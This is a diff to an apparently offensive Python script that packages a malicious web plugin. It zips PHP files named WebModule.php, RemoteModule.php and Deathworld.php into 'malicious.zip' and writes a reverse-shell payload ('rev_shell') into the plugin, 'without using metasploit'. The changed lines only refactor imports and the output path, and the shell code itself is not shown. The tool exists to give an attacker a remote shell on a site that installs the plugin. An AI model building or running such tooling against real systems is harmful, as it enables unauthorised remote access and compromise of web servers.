@@ -13,10 +13,10 @@
 #                   without using metasploit
 #
 import argparse
-import pathlib
 import os
-from random import randint 
 import zipfile
+from pathlib import Path
+from random import randint 
 
 def parseargs():
     """funciton to parse the cmdline args
@@ -44,7 +44,7 @@ def parseargs():
                         '--output',
                         type=str,
                         #description="output path",
-                        default=".")
+                        default="")
     return parser.parse_args()
 
 
@@ -195,7 +195,7 @@ def prepareplugin(args):
     """
     print("[+] started to prepare Plugin")
     # create working directory
-    p = pathlib.Path("temp/")
+    p = Path("temp/")
     p.mkdir(parents=True, exist_ok=True)
     print("[+] created temporary folder")
     #store the plugin script in it
@@ -213,13 +213,30 @@ def prepareplugin(args):
         f.write(rev_shell)
 
 
+def prepareoutputpath(args):
+    """preparing the output path.
+
+    :param args: arguments parsed
+    """
+    if not args.output:
+        return Path("./malicious.zip")
+    else:
+        tmppath = Path(args.output)
+        outpath = tmppath.with_suffix('.zip')
+    if outpath.exists():
+        print("[-] Output path exists, creating default ./malicious.zip")
+        return Path("./malicious.zip")
+    return outpath
+
+
 def createplugin(args):
     """zip the prepared files to a plugin zip
 
     :param args: aguments parsed
     """
     print("[+] Writing files to zip")
-    make_zip = zipfile.ZipFile(f"{args.output}/malicious.zip", 'w')
+    opath = prepareoutputpath(args)
+    make_zip = zipfile.ZipFile(opath.as_posix(), 'w')
     make_zip.write('temp/WebModule.php', 'WebModule.php')
     make_zip.write('temp/RemoteModule.php', 'RemoteModule.php')
     make_zip.write('temp/Deathworld.php', 'Deathworld.php')
